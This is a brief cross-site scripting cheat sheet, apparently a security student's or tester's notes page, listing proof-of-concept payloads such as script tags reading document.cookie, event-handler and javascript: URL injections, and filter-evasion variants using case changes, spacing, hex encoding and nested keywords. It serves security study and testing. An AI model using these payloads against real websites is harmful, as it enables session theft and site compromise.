---
layout: page
title:  "Cross Site Scripting (XSS)"
permalink: "xss.html"
tags: [security, web]
summary: ""
---
## Introduction
* Standard poc atttack string: `"><script>alert(document.cookie)</script>"`


## Strategy
* Test every entrypoint and find where these inputs (chosen so that they shouldn't be filtered) are displayed back to the user
* Sanitized/decoded/modified input can still be enough for exploitation

## Tactics
* Chack the page source code, not only the page rendered by the browser
* URL encode payload ?
* Remain within a tag using `onload` attribute: `" onload=alert()`
* If input returned inside a JS quoted string, ensure injected payload valid. Can comment the remainder using `//`
* Attribute containing an url: `javascript:alert()`
* Invalid image name: `#" onclick="javascript:alert()`

## Filters evading
### script filters
* Add space: `"><script >alert(document.cookie)</script >"`
* Change case: `"><ScRiPt>alert(document.cookie)</ScRiPt>"`
* Hex encoding: `"%3e%3cscript%3ealert(document.cookie)%3c/script%3e"`
* Double `script` keyword: `"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>"`


## Resources and references
* [Example of finding an XSS bug](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff)
* [Toole for easy XSS](https://github.com/chinarulezzz/pixload/blob/master/README.md)
* [A reflected XSS on Facebook](https://medium.com/@win3zz/simple-story-of-some-complicated-xss-on-facebook-8a9c0d80969d)